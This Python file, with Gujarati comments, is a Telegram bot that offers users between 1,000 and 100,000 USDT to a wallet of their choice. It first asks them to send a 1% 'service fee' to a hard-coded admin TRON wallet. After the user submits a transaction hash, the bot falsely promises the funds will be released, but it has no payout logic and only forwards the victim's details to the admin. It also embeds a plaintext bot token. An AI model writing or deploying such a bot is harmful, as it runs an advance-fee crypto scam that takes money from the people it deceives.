import os
import threading
import logging
import requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ----------------- FLASK DUMMY SERVER (PORT BINDING FOR RENDER) -----------------
server = Flask(__name__)

@server.route("/")
def home():
    return "Bot is running healthy 24/7!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    server.run(host="0.0.0.0", port=port, use_reloader=False)

# ----------------- CONFIGURATION -----------------
BOT_TOKEN = "9034747442:AAGTyaKiyCjS02QWpo8Bk2ilZUsmP6ghyJc"
ADMIN_WALLET = "TBZbn9gnVwg2Jam5YdVgjzDxtRyoEr6DYr"
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", None)

# સ્ટેટ્સ
AMOUNT, RECIPIENT_WALLET, AWAIT_CONFIRM, AWAIT_HASH = range(4)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

def get_start_over_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Start Over", callback_data="start_over")]])

# /start કમાન્ડ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    welcome_text = (
        "Welcome!\n\n"
        "Please enter the amount of USDT you require.\n"
        "• Minimum: <b>1,000 USDT</b>\n"
        "• Maximum: <b>100,000 USDT</b>\n\n"
        "Enter the numeric amount below:"
    )
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=get_start_over_keyboard()
        )
    elif update.message:
        await update.message.reply_text(
            welcome_text, parse_mode="HTML", reply_markup=get_start_over_keyboard()
        )
    return AMOUNT

# ૧. રકમ સ્વીકારવી ($1,000 થી $100,000)
async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(",", "")
    
    try:
        amount = float(text)
    except ValueError:
        await update.message.reply_text(
            "⚠️ Invalid input. Please enter a valid number between 1,000 and 100,000.",
            reply_markup=get_start_over_keyboard()
        )
        return AMOUNT

    if amount < 1000 or amount > 100000:
        await update.message.reply_text(
            "⚠️ The amount must be between 1,000 and 100,000 USDT. Please try again:",
            reply_markup=get_start_over_keyboard()
        )
        return AMOUNT

    context.user_data["requested_amount"] = amount

    prompt_wallet = (
        f"✅ <b>Requested Amount:</b> {amount:,.2f} USDT\n\n"
        "Now, please provide your <b>USDT (TRC-20) Wallet Address</b> where you want to receive the funds:"
    )
    await update.message.reply_text(
        prompt_wallet, parse_mode="HTML", reply_markup=get_start_over_keyboard()
    )
    return RECIPIENT_WALLET

# ૨. યુઝરનું TRC-20 એડ્રેસ સ્વીકારવું અને ૧% ફી ચૂકવવાનું કહેવું
async def handle_recipient_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_wallet = update.message.text.strip()

    if not (user_wallet.startswith("T") and len(user_wallet) == 34):
        await update.message.reply_text(
            "⚠️ Invalid TRC-20 Address format. A TRON address starts with 'T' and is 34 characters long.\n"
            "Please send your correct USDT (TRC-20) address:",
            reply_markup=get_start_over_keyboard()
        )
        return RECIPIENT_WALLET

    context.user_data["user_wallet"] = user_wallet
    amount = context.user_data.get("requested_amount", 0)
    fee = amount * 0.01  # ૧% રકમ
    context.user_data["fee_amount"] = fee

    payment_text = (
        f"<b>Order Summary:</b>\n"
        f"• Payout Amount: <b>{amount:,.2f} USDT</b>\n"
        f"• Receiving Address: <code>{user_wallet}</code>\n"
        f"• Service Fee (1%): <b>{fee:,.2f} USDT</b>\n\n"
        f"Please send <b>{fee:,.2f} USDT (TRC-20)</b> to the deposit address below:\n\n"
        f"<code>{ADMIN_WALLET}</code>\n\n"
        "<i>(Tap the address above to copy)</i>\n\n"
        "Once payment is completed, click <b>✅ I Have Paid</b> below:"
    )

    keyboard = [
        [InlineKeyboardButton("✅ I Have Paid", callback_data="paid_confirm")],
        [InlineKeyboardButton("🔄 Start Over", callback_data="start_over")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(payment_text, parse_mode="HTML", reply_markup=reply_markup)
    return AWAIT_CONFIRM

# ૩. બટન ક્લિક હેન્ડલ કરવું
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "paid_confirm":
        await query.message.reply_text(
            "Please enter the <b>Transaction Hash (TxID)</b> of your payment:",
            parse_mode="HTML",
            reply_markup=get_start_over_keyboard()
        )
        return AWAIT_HASH

    elif query.data == "start_over":
        return await start(update, context)

# ૪. ટ્રાન્ઝેક્શન હેશ સ્વીકારવી અને સબમિટ કરવું
async def handle_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tx_hash = update.message.text.strip()
    user = update.effective_user
    requested = context.user_data.get("requested_amount", 0)
    fee = context.user_data.get("fee_amount", 0)
    user_wallet = context.user_data.get("user_wallet", "N/A")

    if len(tx_hash) != 64:
        await update.message.reply_text(
            "⚠️ Invalid Transaction Hash format. A standard TRON TxID is 64 characters long.\n"
            "Please check and send the correct hash:",
            reply_markup=get_start_over_keyboard()
        )
        return AWAIT_HASH

    status_note = "Pending Verification"
    try:
        url = f"https://apilist.tronscanapi.com/api/transaction-info?hash={tx_hash}"
        res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        if res.json().get("confirmed"):
            status_note = "Confirmed on TRON Network"
    except Exception:
        pass

    success_text = (
        "🎉 <b>Your request has been successfully submitted!</b>\n\n"
        f"• <b>Requested:</b> {requested:,.2f} USDT\n"
        f"• <b>Your Receiving Wallet:</b> <code>{user_wallet}</code>\n"
        f"• <b>1% Fee Paid:</b> {fee:,.2f} USDT\n"
        f"• <b>TxID:</b> <code>{tx_hash}</code>\n\n"
        "Our team will verify the payment and release your funds shortly."
    )

    await update.message.reply_text(
        success_text, parse_mode="HTML", reply_markup=get_start_over_keyboard()
    )

    logging.info(
        f"NEW ORDER | User: @{user.username} ({user.id}) | Req: {requested} | To: {user_wallet} | Fee: {fee} | Tx: {tx_hash}"
    )

    if ADMIN_CHAT_ID:
        admin_text = (
            f"🔔 <b>New Payout Order Submitted</b>\n\n"
            f"<b>User:</b> @{user.username} (ID: <code>{user.id}</code>)\n"
            f"<b>Requested USDT:</b> {requested:,.2f}\n"
            f"<b>Client TRC-20 Wallet:</b> <code>{user_wallet}</code>\n"
            f"<b>1% Fee:</b> {fee:,.2f} USDT\n"
            f"<b>TxID:</b> <code>{tx_hash}</code>\n"
            f"<b>Status:</b> {status_note}\n"
            f"<b>Tronscan:</b> https://tronscan.org/#/transaction/{tx_hash}"
        )
        try:
            await context.bot.send_message(chat_id=int(ADMIN_CHAT_ID), text=admin_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Admin message error: {e}")

    context.user_data.clear()
    return ConversationHandler.END

# કેન્સલ કમાન્ડ
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "Process cancelled. Send /start to begin again.",
        reply_markup=get_start_over_keyboard()
    )
    return ConversationHandler.END

def main():
    # Flask સર્વર બેકગ્રાઉન્ડ થ્રેડમાં
    threading.Thread(target=run_web, daemon=True).start()

    # Telegram Bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(button_callback, pattern="^start_over$")
        ],
        states={
            AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount),
                CallbackQueryHandler(button_callback, pattern="^start_over$")
            ],
            RECIPIENT_WALLET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_recipient_wallet),
                CallbackQueryHandler(button_callback, pattern="^start_over$")
            ],
            AWAIT_CONFIRM: [
                CallbackQueryHandler(button_callback)
            ],
            AWAIT_HASH: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_hash),
                CallbackQueryHandler(button_callback, pattern="^start_over$")
            ],
        },
        fallbacks=[
            CommandHandler("start", start),      # યુઝર વચ્ચે પણ /start લખે તો રીસેટ થાય
            CommandHandler("cancel", cancel),
            CallbackQueryHandler(button_callback, pattern="^start_over$")
        ],
        allow_reentry=True   # ગમે ત્યારે ફરીથી /start કામ કરશે
    )

    app.add_handler(conv_handler)

    print("Starting bot polling...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
